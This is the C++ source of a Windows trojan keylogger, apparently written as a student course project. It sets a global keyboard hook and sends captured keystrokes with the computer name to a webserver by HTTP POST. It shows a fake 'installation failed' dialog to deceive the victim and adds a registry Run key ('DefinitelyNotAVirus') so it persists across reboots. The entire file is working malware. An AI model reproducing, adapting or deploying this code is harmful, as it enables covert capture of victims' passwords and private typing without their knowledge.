/*******************************************************************
 *  FILE: keylogger.cpp
 *  AUTHORS: Keven McDowell and Robbie Cichon
 *  PROJECT: Trojan Keylogger CSC590
 *  DESCRIPTION: Main file for the actual keylogger itself. Provides
 *  main function and sets an operating system hook that reads all 
 *  keyboard input regardless of the application in focus.
 *  Callback function that is called everytime a keystroke happens
 *  checks the key being hit and adds it to the current set of keystrokes.
 *  If a user hits space or enter, the keylogger immediately sends the
 *  current set of keystrokes to the webserver.  All functionality is
 *  specific to Windows and is made possible using the Windows API, gracefully
 *  provided to us by Microsoft.
 * *****************************************************************/

// Libraries for std output and the Windows API.
// Also including the HttpRequest class for building and sending server requests.
#include <iostream>
#include "headers/HttpRequest.h"
#include "headerSource/HttpRequest.cpp" // Custom Class made for building and sending HTTP POST requests to the webserver containing our keystrokes.
#include <windows.h>
#include <string>

// Had to lookup a way to deal with weird encoding defined through the windows api.
#ifndef UNICODE // Have to have this in order to make converting from TCHAR to std::string easy due to character encoding issues.
typedef std::string String;
#else
typedef std::wstring String;
#endif

// Defining variable for our operating system hook.
HHOOK keyboard;

// Structure containing information about the keyboard whenever a key is hit.
KBDLLHOOKSTRUCT keyboardstruct;

// Variable containing our current keystroke set.
std::string keystrokes;

/**********************************************************************
 * FUNCTION: Callback
 * 
 * Written By: Keven McDowell and Robbie Cichon
 * 
 * PARAMETERS: 
 *      int keyboardcode:
 *          -Message from keyboard telling us how to process the message.
 *      WPARAM wParam 
 *          -Windows message used to identify the type of keyboard message.
 *      LPARAM lParam
 *          -Acts as a pointer to a KDBLLHOOKSTRUCT, which is what we use
 *           to get access to the actual input coming in from the keyboard.
 *  
 * DESCRIPTION: Function used to process the input we recieve from the keyboard. 
 * We make sure the keyboard code is valid. If it is, we process the keyboard code and
 * decide what to do from there. We have to handle caps lock, shift, enter and space, and
 * we have to prevent the request being broken by weird characters that occur when hitting
 * random keys.  When enter or space is hit, the request to the server is built and sent.
 * ********************************************************************/
LRESULT __stdcall Callback(int keyboardcode, WPARAM wParam, LPARAM lParam)
{
    if (keyboardcode >= 0) // Here we check and make sure the message from the keyboard is valid.
    {
        // Here we cast out keyboard input into a KBDLLHOOKSTRUCT defined by the windows api, so we can access the keyboard data.
        keyboardstruct = *((KBDLLHOOKSTRUCT *)lParam); 
        if (wParam == WM_KEYDOWN) // If the keyboard message is that a key was pressed down.
        {
            // If enter or space is pressed.
            if (keyboardstruct.vkCode == 13 || keyboardstruct.vkCode == 32)
            {
                HttpRequest newRequest; // Make a new httpRequest
                TCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
                DWORD nameLength = MAX_COMPUTERNAME_LENGTH + 1;
                // Here we grab the host name of the computer to be sent to the server inside the JSON.
                if (!GetComputerName(computerName, &nameLength))
                {
                    newRequest.setComputerName("Unknown");
                }
                else
                {
                    // Here we had to do some weird string conversions due to the encoding weirdness with the Windows api.
                    // It is a pain to get from TCHAR[] to string.
                    String wStringConvert = computerName;
                    String stdStringConvert(wStringConvert.begin(), wStringConvert.end());
                    newRequest.setComputerName(stdStringConvert);
                }

                //Here we give out request the keystrokes, the http method to use, and the endpoint the keystrokes are going to.
                newRequest.setKeystrokes(keystrokes);
                newRequest.setMethod("POST");
                newRequest.setUrl("/sendkeys");

                //Build and send the request.
                newRequest.buildRequest();
                newRequest.sendRequest();

                //Clear the keystrokes so that we can get new ones.
                keystrokes.clear();
            }
            else
            {
                // Checks to make sure that the key is either a number or a letter. 
                // Purpose of this was to fix issue where the request would break because
                // of weird characters being added when shift, a function key, or other
                // random keys would be pressed and somehow added to the set of 
                // keystrokes.

                // This part was written by Robbie Cichon and then updated by Keven McDowell.
                if (keyboardstruct.vkCode >= 0x30 && keyboardstruct.vkCode <= 0x5A)
                {
                    // Here we check if shift or caps lock is on so we can handle capital letters.
                    if (GetKeyState(16) < 0 || GetKeyState(VK_CAPITAL) == 1)
                    {
                        // Grab the keyboard character and add it to the set of keystrokes.
                        char c = MapVirtualKey(keyboardstruct.vkCode, 2);
                        keystrokes.append(std::string(1, (char)toupper(c)));
                    }
                    else
                    {
                        // Grab the keyboard character and add it to the set of keystrokes.
                        char c = MapVirtualKey(keyboardstruct.vkCode, 2);
                        keystrokes.append(std::string(1, (char)tolower(c)));
                    }
                }
            }
        }
    }

    // Moves on to the next hook call.
    return CallNextHookEx(keyboard, keyboardcode, wParam, lParam);
}

/**********************************************************************
 * FUNCTION: CreateHook
 * 
 * Written By: Robbie Cichon
 *  
 * DESCRIPTION: Function that we use to invoke the operating system hook we made.
 * ********************************************************************/
void CreateHook()
{
    keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, Callback, NULL, 0);  // Windows API Function call to set the hook.
}

/**********************************************************************
 * FUNCTION: Callback
 * 
 * Written By: Keven McDowell and Robbie Cichon
 * Robbie wrote all of this function outside of the message box and the registry stuff.
 * 
 * PARAMETERS: 
 *      HINSTANCE hinstance1
 *          -Handle to the current instance of the keylogger.
 *      HINSTANCE hinstance2
 *          -Handle to the previous instance of the keylogger.
 *      LPSTR lpstr
 *          -Commmand line for the keylogger excluding the name of the program.
 *      int cmd
 *          -Not really sure what this does and the windows api docs don't tell us. Something with
 *           showing the command line.
 *  
 * DESCRIPTION: Main Function for Windows API Applications. At the start of the app, we set the operating system keyboard
 * hook, then display a message box that says the installation failed, which is meant to trick the user. Then we try and create
 * a registry key that is meant to force the keylogger to start whenever the computer boots. This request that the 
 * keylogger be saved in C:/ and that the keylogger be run with admin privileges. The keylogger still works without 
 * this succeeding.  
 * ********************************************************************/
int WINAPI WinMain(HINSTANCE hinstance1, HINSTANCE hinstance2, LPSTR lpstr, int cmd)
{
    CreateHook();
    MSG msg;
    MessageBox(NULL, "Something Went Wrong During Installation! Please try again or visit our support page.", "ERROR", MB_ICONWARNING);
    HKEY registryKey = NULL;
    char* keyloggerPath = "C:\\NotAVirus.exe"; // Path that the keylogger must be at for the registry key stuff to work.
    RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &registryKey); // Creating a registry key for the keylogger.
    LONG success = RegSetValueEx(registryKey, "DefinitelyNotAVirus", 0, REG_SZ, (unsigned char *)keyloggerPath, strlen(keyloggerPath)); // Adding the key to the registry.
    if(success == ERROR_SUCCESS)
    {
        std::cout << "Successfully made registry key." << std::endl;
    }
    else
    {
        std::cout << "Failed to make registry key." << std::endl;
    }
    while (GetMessage(&msg, NULL, 0, 0)) // Message loop for a windows Api application.
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return msg.wParam; // Returns the windows message from the application when it closes.
}